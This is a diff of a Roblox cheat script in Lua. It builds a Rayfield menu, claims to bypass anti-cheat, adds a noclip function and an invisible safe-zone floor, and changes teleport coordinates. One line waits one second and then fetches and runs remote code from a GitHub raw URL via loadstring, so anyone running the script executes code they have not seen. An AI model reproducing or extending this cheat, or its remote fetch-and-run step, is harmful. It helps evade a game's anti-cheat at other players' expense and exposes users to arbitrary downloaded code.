@@ -14,13 +14,13 @@ local Window = Rayfield:CreateWindow({
 
 -- Mostra notificação inicial
 Rayfield:Notify({
-    Title = "Credits: juão",
+    Title = "credits: juão",
     Content = "bypassed anti-cheat (It's not 100% safe)",
-    Duration = 10,
+    Duration = 5,
     Image = 4483362458
 })
 
--- Aguarda 10 segundos e executa o loadstring
+-- Aguarda 1 segundo e executa o loadstring remoto
 task.delay(1, function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
 end)
@@ -30,6 +30,7 @@ local TeleportTab = Window:CreateTab("Teleports", 4483362458)
 
 -- Serviços e função de teleporte
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local Workspace = game:GetService("Workspace")
 local player = Players.LocalPlayer
 
@@ -39,6 +40,26 @@ local function teleportTo(position)
     if root then
         root.CFrame = CFrame.new(position)
     end
+end
+
+-- Função de noclip
+local noclipActive = false
+local noclipConnection
+
+local function enableNoclip()
+    if noclipActive then return end
+    noclipActive = true
+
+    noclipConnection = RunService.Stepped:Connect(function()
+        local character = player.Character
+        if character then
+            for _, part in pairs(character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false
+                end
+            end
+        end
+    end)
 end
 
 -- Botões de teleporte
@@ -77,20 +98,21 @@ TeleportTab:CreateButton({
     end
 })
 
+-- Botão de Safe Zone com noclip e chão invisível
 TeleportTab:CreateButton({
-    Name = "Safe Zone (fully working)",
+    Name = "Safe Zone (super safe!)",
     Callback = function()
-        teleportTo(Vector3.new(-88, 4, 311))
+        teleportTo(Vector3.new(-54, 15, 252))
+        enableNoclip()
 
-        -- Criação do chão invisível sólido
         if not Workspace:FindFirstChild("SafeZoneFloor") then
             local floor = Instance.new("Part")
             floor.Name = "SafeZoneFloor"
-            floor.Size = Vector3.new(100, 1, 100)
-            floor.Position = Vector3.new(47, 20, 67)
+            floor.Size = Vector3.new(20, 1, 20)
+            floor.Position = Vector3.new(-54, 50, 252)
             floor.Anchored = true
             floor.CanCollide = true
-            floor.Transparency = 0.9
+            floor.Transparency = 1
             floor.Parent = Workspace
         end
     end
